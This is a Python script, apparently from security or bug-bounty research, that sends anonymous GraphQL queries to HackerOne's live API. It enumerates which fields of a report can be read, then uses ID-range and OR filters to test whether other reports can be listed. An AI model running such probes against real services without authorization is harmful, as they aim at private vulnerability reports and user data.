# -*- coding: utf-8 -*-
"""h1x10: 匿名字段枚举 — 公开报告 2487889 上探测 reports 表可用列"""
import sys, io, json
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()

s = requests.Session()
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36',
    'Accept': 'application/json',
    'Content-Type': 'application/json',
})

def gql(q, tag):
    r = s.post('https://hackerone.com/graphql', json={'query': q, 'variables': {}}, timeout=25)
    try:
        j = r.json()
    except Exception:
        print(f'[{tag}] {r.status_code} NONJSON: {r.text[:200]}')
        return
    if 'errors' in j:
        print(f'[{tag}] ERR: {json.dumps(j["errors"])[:220]}')
    else:
        print(f'[{tag}] OK: {json.dumps(j["data"])[:400]}')

RID = 2487889
# 逐字段探测
fields_single = ['title', 'state', 'vulnerability_information', 'reporter', 'team', 'created_at', 'severity', 'weakness', 'reference', 'bounty_amount', 'disclosed_at', 'activities', 'comments', 'database_id', '_id', 'graphql_id', 'cve_ids', 'custom_fields', 'substate', 'source']
for f in fields_single:
    gql(f'query {{ reports(where: {{id: {{_eq: {RID}}}}}) {{ nodes {{ {f} }} }} }}', f'field:{f}')

# team 嵌套字段
gql(f'query {{ reports(where: {{id: {{_eq: {RID}}}}}) {{ nodes {{ team {{ id name handle profile_picture }} }} }} }}', 'nested:team')
# reporter 嵌套
gql(f'query {{ reports(where: {{id: {{_eq: {RID}}}}}) {{ nodes {{ reporter {{ id username name }} }} }} }}', 'nested:reporter')
# where 操作符 (模糊/区间枚举能力)
gql('query { reports(where: { id: { _gt: 2487880, _lt: 2487900 } }) { nodes { id title } } }', 'where:range')
gql('query { reports(where: { _or: [{id: {_eq: 2487889}}, {id: {_eq: 2487880}}] }) { nodes { id } } }', 'where:or')
gql('query { reports(first: 5) { nodes { id title } } }', 'no-where')
